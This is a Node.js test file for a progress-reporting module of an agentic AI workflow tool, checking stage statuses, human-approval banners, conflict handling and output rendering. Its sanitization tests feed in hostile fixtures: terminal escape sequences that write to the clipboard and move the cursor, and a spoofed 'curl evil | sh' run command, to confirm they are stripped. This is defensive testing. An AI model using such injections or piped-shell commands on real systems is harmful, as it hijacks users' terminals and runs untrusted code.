#!/usr/bin/env node
'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const {
  PHASES,
  needsYou,
  deriveRoleGroupStatus,
  effectiveStatus,
  consistencyIssues,
  currentWork,
  percentComplete,
  buildSummary,
  commandFor,
  renderTerminal,
  renderMarkdown,
} = require('./progress');

function staleApprovedState() {
  return {
    status: 'active',
    phases: {
      request: { status: 'pass' },
      requirements: { status: 'pass' },
      'acceptance-criteria': { status: 'pass' },
      'definition-of-done': { status: 'pass' },
      inspection: { status: 'pass' },
      analysis: { status: 'in_progress' },
      plan: { status: 'in_progress' },
      approval: { status: 'pass' },
    },
    roles: {
      analysis: {
        architect: { status: 'pass', executor: 'claude' },
        security: { status: 'pass', executor: 'claude' },
        'qa-plan': { status: 'pass', executor: 'claude' },
      },
    },
  };
}

{
  const state = staleApprovedState();
  assert.strictEqual(deriveRoleGroupStatus(state, 'analysis'), 'pass');
  assert.strictEqual(effectiveStatus(state, 'analysis'), 'pass');
  assert.strictEqual(effectiveStatus(state, 'plan'), 'pass');
  assert.strictEqual(currentWork(state), 'Waiting for Implementation');
  assert.ok(consistencyIssues(state).length >= 2);
  assert.strictEqual(percentComplete(state), Math.round((8 / PHASES.length) * 100), 'eight finished stages');
}

{
  const state = {
    status: 'active',
    phases: { analysis: { status: 'in_progress' } },
    selectedRoles: { analysis: ['architect', 'security'] },
    roles: {
      analysis: {
        architect: { status: 'pass', executor: 'claude' },
        security: { status: 'pending', executor: 'claude' },
      },
    },
  };
  assert.strictEqual(deriveRoleGroupStatus(state, 'analysis'), 'in_progress');
  assert.strictEqual(effectiveStatus(state, 'analysis'), 'in_progress');
  assert.strictEqual(currentWork(state), 'Specialist Analysis');
  // Parallel roles: every running role is named, not just the first.
  state.roles.analysis.architect.status = 'in_progress';
  state.roles.analysis.security.status = 'in_progress';
  assert.strictEqual(currentWork(state), 'Specialist Analysis → architect, security');
  // A sibling that already failed does not turn a running stage red: the
  // stage stays in_progress, and the running role is still named.
  state.roles.analysis.architect.status = 'fail';
  assert.strictEqual(deriveRoleGroupStatus(state, 'analysis'), 'in_progress');
  assert.strictEqual(effectiveStatus(state, 'analysis'), 'in_progress');
  assert.strictEqual(currentWork(state), 'Specialist Analysis → security');
  // Once nothing runs any more, the failure shows.
  state.roles.analysis.security.status = 'pass';
  assert.strictEqual(effectiveStatus(state, 'analysis'), 'fail');
  state.roles.analysis.architect.status = 'blocked';
  assert.strictEqual(effectiveStatus(state, 'analysis'), 'blocked');
}

{
  const state = {
    status: 'active',
    phases: { analysis: { status: 'in_progress' } },
    selectedRoles: { analysis: ['architect', 'security'] },
    roles: {
      analysis: {
        architect: { status: 'pass', executor: 'claude' },
        security: { status: 'pass', executor: 'claude' },
      },
    },
  };
  assert.strictEqual(deriveRoleGroupStatus(state, 'analysis'), 'pass');
  assert.strictEqual(effectiveStatus(state, 'analysis'), 'pass');
  assert.strictEqual(currentWork(state), 'Waiting for Request');
}

{
  const state = {
    status: 'active',
    phases: {
      analysis: { status: 'in_progress' },
      plan: { status: 'in_progress' },
    },
    roles: {
      analysis: {
        security: { status: 'in_progress', executor: 'claude' },
      },
    },
  };
  assert.strictEqual(currentWork(state), 'Implementation Plan');
  assert.ok(consistencyIssues(state).some(message => message.includes('Multiple stored phases')));
}

// The pull-request stage comes after final verification.
{
  const verified = () => ({ status: 'active', phases: Object.fromEntries(PHASES.filter(p => p !== 'pull-request').map(p => [p, { status: 'pass' }])), roles: {} });
  assert.strictEqual(PHASES[PHASES.length - 1], 'pull-request');
  const waiting = verified();
  assert.strictEqual(currentWork(waiting), 'Waiting for Pull Request');
  assert.strictEqual(percentComplete(waiting), Math.round(((PHASES.length - 1) / PHASES.length) * 100));
  assert.strictEqual(buildSummary('FEAT-1', waiting).pullRequestHint, null, 'no hint while the stage is still to run');

  // Skipped (opt-in disabled): complete, with the command that opens it.
  const previous = process.env.AI_AGENTIC_CLI;
  process.env.AI_AGENTIC_CLI = '1';
  const skipped = verified();
  skipped.phases['pull-request'] = { status: 'skipped', note: 'pull_request.enabled is not true' };
  assert.strictEqual(percentComplete(skipped), 100);
  assert.strictEqual(currentWork(skipped), 'Done');
  const skippedSummary = buildSummary('FEAT-1', skipped);
  assert.strictEqual(skippedSummary.pullRequestHint, 'agentic pr FEAT-1');
  assert.match(renderTerminal(skippedSummary), /Pull request: not opened — run: agentic pr FEAT-1/);
  assert.match(renderMarkdown(skippedSummary), /\*\*Pull request:\*\* not opened — run `agentic pr FEAT-1`/);
  if (previous === undefined) delete process.env.AI_AGENTIC_CLI; else process.env.AI_AGENTIC_CLI = previous;

  // Blocked: named as the current stop.
  const blocked = verified();
  blocked.phases['pull-request'] = { status: 'blocked', note: 'missing credentials' };
  assert.strictEqual(currentWork(blocked), 'Pull Request (blocked)');

  // Opened: the number and URL near the top, whitelisted fields only.
  const opened = verified();
  opened.phases['pull-request'] = { status: 'pass' };
  opened.pullRequest = { provider: 'bitbucket', number: 7762, url: 'https://bitbucket.org/ws/app/pull-requests/7762', status: 'open', branch: 'ai/FEAT-1', base: 'master', draft: false, commit: 'abc', preCommitSha: 'def', reason: 'internal' };
  const summary = buildSummary('FEAT-1', opened);
  assert.deepStrictEqual(Object.keys(summary.pullRequest).sort(), ['base', 'branch', 'draft', 'number', 'provider', 'status', 'url']);
  const terminal = renderTerminal(summary).split('\n');
  const prRow = terminal.findIndex(line => line.includes('Pull request: #7762 https://bitbucket.org/ws/app/pull-requests/7762'));
  assert.ok(prRow > 0 && prRow < terminal.findIndex(line => line.includes('Request ')), 'the PR line sits above the stage list');
  assert.match(renderMarkdown(summary), /\*\*Pull request:\*\* \[#7762\]\(https:\/\/bitbucket\.org\/ws\/app\/pull-requests\/7762\)/);

  // A run closed before the stage existed is finished, not stuck at 93%.
  const closed = verified();
  closed.status = 'done';
  assert.strictEqual(effectiveStatus(closed, 'pull-request'), 'skipped');
  assert.strictEqual(percentComplete(closed), 100);
  // It shows no "agentic pr" hint (its PR may have been opened by hand), and no
  // "(stored: pending)" next to a status the view derived itself.
  const closedSummary = buildSummary('FEAT-OLD', closed);
  assert.strictEqual(closedSummary.pullRequestHint, null, 'no hint for a run closed before the stage existed');
  assert.strictEqual(closedSummary.phases.find(p => p.id === 'pull-request').rawStatus, undefined);
  assert.ok(!/stored: pending/.test(renderTerminal(closedSummary)), renderTerminal(closedSummary));
  assert.ok(!/Pull request: not opened/.test(renderTerminal(closedSummary)));

  // An abandoned run never reached the stage: it is not counted as done.
  const abandoned = { status: 'done', abandoned: true, roles: {}, phases: Object.fromEntries(PHASES.slice(0, 6).map(p => [p, { status: 'pass' }])) };
  const before = { ...abandoned, status: 'active', abandoned: undefined };
  assert.strictEqual(effectiveStatus(abandoned, 'pull-request'), 'pending');
  assert.strictEqual(percentComplete(abandoned), Math.round((6 / (PHASES.length - 1)) * 100), 'the stage it never reached is left out of the percent');
  assert.ok(percentComplete(abandoned) < 100 && percentComplete(abandoned) >= percentComplete(before));
  assert.strictEqual(buildSummary('FEAT-GAVEUP', abandoned).pullRequestHint, null);
  // A closed run that has the stage gets the hint with --reopen.
  const closedSkipped = verified();
  closedSkipped.status = 'done';
  closedSkipped.phases['pull-request'] = { status: 'skipped', note: 'pull_request.enabled is not true' };
  assert.match(buildSummary('FEAT-2', closedSkipped).pullRequestHint, / pr FEAT-2 --reopen$/);
}

// Needs you: what the run waits on a human for, with the reason and the command.
{
  const passed = upTo => Object.fromEntries(PHASES.slice(0, PHASES.indexOf(upTo)).map(p => [p, { status: 'pass' }]));
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'progress-needs-'));
  try {
    assert.strictEqual(needsYou('FEAT-1', { status: 'active', phases: passed('analysis'), roles: {} }, { root }), null, 'nothing waits on a human mid-run');
    assert.strictEqual(needsYou('FEAT-1', { status: 'done', phases: { 'build-test': { status: 'fail', note: 'x' } } }, { root }), null, 'a closed run needs nobody');

    // A failed stage: its reason, and the retry command as this install spells it.
    const failed = { status: 'active', roles: {}, phases: { ...passed('build-test'), 'build-test': { status: 'fail', updatedAt: '2026-11-04T10:00:00.000Z', note: 'build-test/qa-execute: 3 widget tests fail in test/login_test.dart' } } };
    const attention = needsYou('FEAT-1', failed, { root, cli: true });
    assert.deepStrictEqual(
      [attention.kind, attention.stage, attention.headline, attention.reason, attention.command, attention.repeated, attention.key],
      ['fail', 'build-test', 'Build + Tests failed', 'build-test/qa-execute: 3 widget tests fail in test/login_test.dart', 'agentic retry FEAT-1', 0, 'FEAT-1|build-test|fail|2026-11-04T10:00:00.000Z']);
    assert.strictEqual(needsYou('FEAT-1', failed, { root, cli: false }).command, 'node ai/tasks/feature/runs.js retry FEAT-1 && node ai/workflow/engine.js resume FEAT-1');
    // The same failure again: the stage cannot fix it.
    failed.phases['build-test'].repeatedFailure = 3;
    const repeated = needsYou('FEAT-1', failed, { root, cli: true });
    assert.strictEqual(repeated.headline, 'Same failure as last time — this needs a fix outside Build + Tests');
    assert.strictEqual(repeated.repeated, 3);
    const summary = buildSummary('FEAT-1', failed, { root });
    assert.deepStrictEqual(summary.needsYou, needsYou('FEAT-1', failed, { root }));
    const terminal = renderTerminal(summary);
    assert.match(terminal, /⚠ Needs you: Same failure as last time — this needs a fix outside Build \+ Tests\n {3}build-test\/qa-execute: 3 widget tests fail in test\/login_test\.dart\n {3}→ run: /);
    assert.ok(terminal.indexOf('Needs you') < terminal.indexOf('Request '), 'the banner sits above the stage list');
    const markdown = renderMarkdown(summary);
    assert.match(markdown, /> ⚠ \*\*Needs you:\*\* Same failure as last time — this needs a fix outside Build \+ Tests/);
    assert.match(markdown, /> Run: `node ai\/tasks\/feature\/runs\.js retry FEAT-1 && node ai\/workflow\/engine\.js resume FEAT-1`/);
    assert.match(markdown, /> build-test\/qa-execute: 3 widget tests fail/);
    // The published GitHub comment never carries run notes: headline and command only.
    const published = renderMarkdown(summary, { published: true });
    assert.match(published, /\*\*Needs you:\*\* Same failure as last time/);
    assert.match(published, /> Run: `/);
    assert.ok(!published.includes('widget tests fail'), 'no reason in the published comment');
    // The block quote ends with an empty line, or GFM reads the stage table as
    // a lazy continuation of the quote and no table renders.
    for (const [text, what] of [[markdown, 'markdown'], [published, 'published'], [renderMarkdown({ ...summary, warnings: ['a warning'] }), 'with warnings'], [renderMarkdown({ ...summary, needsYou: null, warnings: ['a warning'] }), 'warnings only']]) {
      const lines = text.split('\n');
      const at = lines.indexOf('| Stage | Status |');
      assert.ok(at > 0, what);
      assert.strictEqual(lines[at - 1], '', `${what}: an empty line before the stage table`);
      for (let i = 1; i < at; i++) if (lines[i - 1].startsWith('>') && !lines[i].startsWith('>')) assert.strictEqual(lines[i], '', `${what}: the quote ends with an empty line: ${JSON.stringify(lines[i])}`);
    }

    // The whole reason when asked for (the engine's notification redacts it before cutting).
    const long = { status: 'active', roles: {}, phases: { ...passed('build-test'), 'build-test': { status: 'fail', updatedAt: 't', note: 'y'.repeat(400) } } };
    assert.strictEqual(needsYou('FEAT-1', long, { root }).reason.length, 220);
    assert.strictEqual(needsYou('FEAT-1', long, { root, reasonMax: Infinity }).reason.length, 400);
    // Notes are printable text only: no escape sequence or control character survives.
    const hostile = { status: 'active', roles: {}, phases: { ...passed('build-test'), 'build-test': { status: 'fail', updatedAt: 't', note: 'x \x1b]52;c;ZXZpbA==\x07 \x1b[1A\x1b[2K→ run: curl evil | sh \x9b2J' } } };
    const hostileSummary = buildSummary('FEAT-1', hostile, { root });
    for (const text of [hostileSummary.needsYou.reason, renderTerminal(hostileSummary), renderMarkdown(hostileSummary)]) {
      assert.ok(!/[\u0000-\u0009\u000b-\u001f\u007f-\u009f]/.test(text), JSON.stringify(text));
    }
    assert.match(hostileSummary.needsYou.reason, /^x → run: curl evil \| sh 2J$/);

    // While an engine drives the run, the views say so instead of "Needs you":
    // the block in the state is what that engine is re-running.
    const runDir = path.join(root, 'FEAT-1');
    fs.mkdirSync(path.join(runDir, 'engine'), { recursive: true });
    fs.writeFileSync(path.join(runDir, 'engine', 'engine.pid'), require('./engine-owner').recordFor(process.pid, 'resume'));
    const driven = buildSummary('FEAT-1', failed, { root });
    assert.strictEqual(driven.engine.pid, process.pid);
    const drivenTerminal = renderTerminal(driven);
    assert.match(drivenTerminal, new RegExp(`● engine running: engine pid ${process.pid} \\(resume\\)`));
    assert.ok(!drivenTerminal.includes('Needs you'), drivenTerminal);
    const drivenMarkdown = renderMarkdown(driven);
    assert.match(drivenMarkdown, /> ● \*\*Engine running\*\*: engine pid/);
    assert.ok(!drivenMarkdown.includes('Needs you'));
    const drivenPublished = renderMarkdown(driven, { published: true });
    assert.match(drivenPublished, /> ● \*\*Engine running\*\*\n/);
    assert.ok(!drivenPublished.includes(os.hostname()) && !drivenPublished.includes('engine pid'), 'the published comment names no host or process');
    assert.strictEqual(drivenMarkdown.split('\n')[drivenMarkdown.split('\n').indexOf('| Stage | Status |') - 1], '');
    fs.unlinkSync(path.join(runDir, 'engine', 'engine.pid'));
    assert.strictEqual(buildSummary('FEAT-1', failed, { root }).engine, null);
    assert.strictEqual(buildSummary('FEAT-1', failed, { root, demo: true }).engine, null, 'the demo never looks');

    // A parallel stage: the failed roles and their notes.
    const reviews = { status: 'active', phases: { ...passed('reviews'), reviews: { status: 'in_progress' } }, selectedRoles: { reviews: ['code-review', 'security-review'] }, roles: { reviews: { 'code-review': { status: 'pass' }, 'security-review': { status: 'fail', note: 'review reports unresolved findings', updatedAt: 't1', repeatedFailure: 2 } } } };
    const review = needsYou('FEAT-2', reviews, { root, cli: true });
    assert.deepStrictEqual([review.stage, review.reason, review.repeated, review.key], ['reviews', 'security-review: review reports unresolved findings', 2, 'FEAT-2|reviews|fail|t1']);

    // A blocked conditional role: its stage still reads pending.
    const conditional = { status: 'active', roles: {}, phases: passed('verification'), conditionals: { verification: { 'mobile-evidence': { status: 'blocked', reason: 'no booted Android emulator', updatedAt: 't2' } } } };
    const evidence = needsYou('FEAT-3', conditional, { root, cli: true });
    assert.deepStrictEqual([evidence.kind, evidence.stage, evidence.role, evidence.headline, evidence.reason, evidence.command], ['blocked', 'verification', 'mobile-evidence', 'Final Verification (mobile-evidence) blocked', 'mobile-evidence: no booted Android emulator', 'agentic retry FEAT-3']);
    conditional.phases.verification = { status: 'pass' };
    assert.strictEqual(needsYou('FEAT-3', conditional, { root }), null, 'a stage that passed since is not waiting on its old conditional');

    // A blocked pull request resumes; the furthest stop wins.
    const pr = { status: 'active', roles: {}, phases: { ...passed('pull-request'), 'pull-request': { status: 'blocked', note: 'BITBUCKET_API_TOKEN is not set' }, requirements: { status: 'fail', note: 'stale' } } };
    assert.deepStrictEqual([needsYou('FEAT-4', pr, { root, cli: true }).stage, needsYou('FEAT-4', pr, { root, cli: true }).command], ['pull-request', 'agentic resume FEAT-4']);

    // Human gates: approval (never a key, always the command) and conflicts.
    const gate = { status: 'active', roles: {}, phases: { ...passed('approval'), plan: { status: 'pass', updatedAt: 'p1' } } };
    fs.mkdirSync(path.join(root, 'FEAT-5'), { recursive: true });
    const approval = needsYou('FEAT-5', gate, { root, cli: true });
    assert.deepStrictEqual([approval.kind, approval.stage, approval.headline, approval.command, approval.key], ['waiting', 'approval', 'The plan waits for your approval', 'agentic approve FEAT-5', 'FEAT-5|approval|waiting|p1']);
    fs.writeFileSync(path.join(root, 'FEAT-5', 'plan.approved'), 'approved\n');
    assert.strictEqual(needsYou('FEAT-5', gate, { root }), null, 'approved: nothing waits');
    // Open specialist conflicts: the count, ids and topics, and the exact
    // resolve and resume commands. The key names each finding pair.
    const conflicts = { status: 'active', roles: {}, phases: passed('plan') };
    const conflictsFile = path.join(root, 'FEAT-6', '05-analysis', 'conflicts.json');
    const writeConflicts = list => { fs.mkdirSync(path.dirname(conflictsFile), { recursive: true }); fs.writeFileSync(conflictsFile, JSON.stringify({ conflicts: list })); };
    const six = [{ id: 'CONFLICT-002', topic: 'payments, retries', findings: ['D', 'C'], status: 'unresolved' }, { id: 'CONFLICT-001', topic: 'storage', findings: ['B', 'A'], status: 'unresolved' }, { id: 'CONFLICT-003', status: 'resolved' }];
    writeConflicts(six);
    const disputed = needsYou('FEAT-6', conflicts, { root, cli: true });
    assert.deepStrictEqual([disputed.kind, disputed.stage, disputed.headline, disputed.command, disputed.key], ['waiting', 'plan', '2 conflicts need your decision', 'agentic conflicts FEAT-6', 'FEAT-6|plan|waiting|CONFLICT-001=A+B,CONFLICT-002=C+D']);
    assert.deepStrictEqual(disputed.conflicts, ['CONFLICT-001', 'CONFLICT-002']);
    assert.strictEqual(disputed.reason, 'CONFLICT-001 (storage), CONFLICT-002 (payments, retries). Decide each with: agentic resolve FEAT-6 <conflict-id> --decision "..." --rationale "...", then: agentic resume FEAT-6');
    const disputedNode = needsYou('FEAT-6', conflicts, { root, cli: false });
    assert.strictEqual(disputedNode.command, 'node ai/workflow/conflicts.js list FEAT-6');
    assert.match(disputedNode.reason, /node ai\/workflow\/conflicts\.js resolve FEAT-6 <conflict-id>/);
    assert.match(disputedNode.reason, /then: node ai\/workflow\/engine\.js resume FEAT-6$/);
    assert.strictEqual(needsYou('FEAT-6', conflicts, { root, cli: true }).key, disputed.key, 'a refresh keeps the key: no repeat notification');
    // CURRENT and the terminal banner say a decision waits, not "Waiting for Implementation Plan".
    const previousCli = process.env.AI_AGENTIC_CLI;
    process.env.AI_AGENTIC_CLI = '1';
    try {
      const disputedSummary = buildSummary('FEAT-6', conflicts, { root });
      assert.strictEqual(disputedSummary.current, 'Waiting for conflict decisions');
      assert.strictEqual('Waiting for conflict decisions'.length, 30, 'fits the CURRENT column of agentic runs');
      const disputedTerminal = renderTerminal(disputedSummary);
      assert.ok(disputedTerminal.includes('⚠ Needs you: 2 conflicts need your decision'), disputedTerminal);
      assert.ok(disputedTerminal.includes('→ run: agentic conflicts FEAT-6'), disputedTerminal);
    } finally { if (previousCli === undefined) delete process.env.AI_AGENTIC_CLI; else process.env.AI_AGENTIC_CLI = previousCli; }
    // One decided: the one left is named in the resolve command, and the key changes (a re-notification).
    writeConflicts([six[0], { ...six[1], status: 'resolved' }, six[2]]);
    const one = needsYou('FEAT-6', conflicts, { root, cli: true });
    assert.strictEqual(one.headline, '1 conflict needs your decision');
    assert.ok(one.reason.includes('agentic resolve FEAT-6 CONFLICT-002 --decision'), one.reason);
    assert.strictEqual(one.key, 'FEAT-6|plan|waiting|CONFLICT-002=C+D');
    // Renumbered: the same ids over a different finding pair is a different block.
    writeConflicts([six[0], { ...six[1], findings: ['X', 'Y'] }, six[2]]);
    const renumbered = needsYou('FEAT-6', conflicts, { root, cli: true });
    assert.deepStrictEqual(renumbered.conflicts, disputed.conflicts);
    assert.notStrictEqual(renumbered.key, disputed.key);
    // All decided: no banner, and CURRENT is the plan again.
    writeConflicts(six.map(c => ({ ...c, status: 'resolved' })));
    assert.strictEqual(needsYou('FEAT-6', conflicts, { root }), null);
    assert.strictEqual(buildSummary('FEAT-6', conflicts, { root }).current, 'Waiting for Implementation Plan');
    // While arbitration runs again, the file still holds the previous set: no banner.
    writeConflicts(six);
    assert.strictEqual(needsYou('FEAT-6', { ...conflicts, phases: { ...conflicts.phases, 'conflict-arbitration': { status: 'in_progress' } } }, { root }), null);
    assert.strictEqual(needsYou('FEAT-6', { ...conflicts, phases: { ...conflicts.phases, 'conflict-arbitration': { status: 'pass' } } }, { root, cli: true }).key, disputed.key);
    // A topic is printable text, at most 40 characters.
    writeConflicts([{ id: 'CONFLICT-001', topic: '\x1b]52;c;ZXZpbA==\x07' + 'x'.repeat(300), findings: ['A', 'B'], status: 'unresolved' }]);
    const hostileConflict = needsYou('FEAT-6', conflicts, { root, cli: true });
    assert.ok(!/[\x1b\x07]/.test(hostileConflict.reason), JSON.stringify(hostileConflict.reason));
    assert.ok(hostileConflict.reason.match(/^CONFLICT-001 \(([^)]*)\)/)[1].length <= 40, hostileConflict.reason);
    // Many conflicts: the list shrinks to "+N more" so both commands survive.
    fs.mkdirSync(path.join(root, 'FEAT-8', '05-analysis'), { recursive: true });
    fs.writeFileSync(path.join(root, 'FEAT-8', '05-analysis', 'conflicts.json'), JSON.stringify({ conflicts: Array.from({ length: 7 }, (_, i) => ({ id: `CONFLICT-00${i + 1}`, topic: `a long disputed topic number ${i + 1} `.repeat(4), findings: [`A${i}`, `B${i}`], status: 'unresolved' })) }));
    const many = needsYou('FEAT-8', conflicts, { root, cli: true });
    assert.ok(many.reason.length <= 220, many.reason.length);
    assert.ok(many.reason.includes(' more. Decide each with:'), many.reason);
    assert.ok(many.reason.endsWith('agentic resume FEAT-8'), many.reason);
    const manyFull = needsYou('FEAT-8', conflicts, { root, cli: true, reasonMax: Infinity });
    for (let i = 1; i <= 7; i++) assert.ok(manyFull.reason.includes(`CONFLICT-00${i}`), manyFull.reason);
    assert.strictEqual(commandFor('resolve', 'R1', true, 'CONFLICT-004'), 'agentic resolve R1 CONFLICT-004 --decision "..." --rationale "..."');
    assert.ok(commandFor('resolve', 'R1', false).startsWith('node ai/workflow/conflicts.js resolve R1 '));
    // An architecture selection gate.
    const arch = { status: 'active', roles: {}, phases: { 'architecture-options': { status: 'pass', updatedAt: 'a1' } } };
    assert.deepStrictEqual([needsYou('FEAT-7', arch, { root, cli: true }).stage, needsYou('FEAT-7', arch, { root, cli: true }).command], ['architecture-selection', 'agentic architecture FEAT-7 <option-id>']);
  } finally { fs.rmSync(root, { recursive: true, force: true }); }
}

console.log('progress-selftest OK');
